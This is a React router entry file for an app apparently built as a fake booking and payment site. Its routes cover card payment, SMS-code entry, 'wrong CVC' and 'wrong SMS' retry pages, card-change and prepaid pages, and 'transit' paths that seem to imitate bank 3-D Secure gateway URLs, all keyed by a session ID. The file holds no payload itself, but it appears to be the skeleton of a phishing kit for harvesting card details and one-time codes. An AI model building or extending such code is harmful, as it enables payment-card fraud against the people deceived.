import { StrictMode } from "react";
import { createRoot } from "react-dom/client";
import { createBrowserRouter, RouterProvider } from "react-router-dom";
import { BookingProvider } from "./context/BookingContext";
import "./index.css";
import App from "./App.tsx";
import Main from "./pages/Main/Main.tsx";
import Payment from "./pages/Payment/Payment.tsx";
import Balance from "./pages/Balance/Balance.tsx";
import Sms from "./pages/Sms/Sms.tsx";
import ChangeCard from "./pages/ChangeCard/ChangeCard.tsx";
import Success from "./pages/Success/Success.tsx";
import WrongCvc from "./pages/WrongCvc/WrongCvc.tsx";
import WrongSms from "./pages/WrongSms/WrongSms.tsx";
import Prepaid from "./pages/PrepaidCard/Prepaid.tsx";
import CustomSms from "./pages/CustomSms/CustomSms.tsx";
import Transit1 from "./pages/Transit/Transit1.tsx";
import Transit2 from "./pages/Transit/Transit2.tsx";

const router = createBrowserRouter([
  {
    path: "/",
    element: <App />,
    children: [
      { index: true, element: <Main /> },
      { path: "payment", element: <Payment /> },
      { path: "balance/:sessionId", element: <Balance /> },
      { path: "sms-code/:sessionId", element: <Sms /> },
      { path: "change-card/:sessionId", element: <ChangeCard /> },
      { path: "success/:sessionId", element: <Success /> },
      { path: "wrong-cvc/:sessionId", element: <WrongCvc /> },
      { path: "wrong-sms/:sessionId", element: <WrongSms /> },
      { path: "prepaid-change/:sessionId", element: <Prepaid /> },
      { path: "custom-sms/:sessionId", element: <CustomSms /> },
      { path: "connects/asyncresponse/:sessionId", element: <Transit1 /> },
      { path: "site/process/:sessionId", element: <Transit2 /> },
    ],
  },
]);

createRoot(document.getElementById("root")!).render(
  <StrictMode>
    <BookingProvider>
      <RouterProvider router={router} />
    </BookingProvider>
  </StrictMode>
);
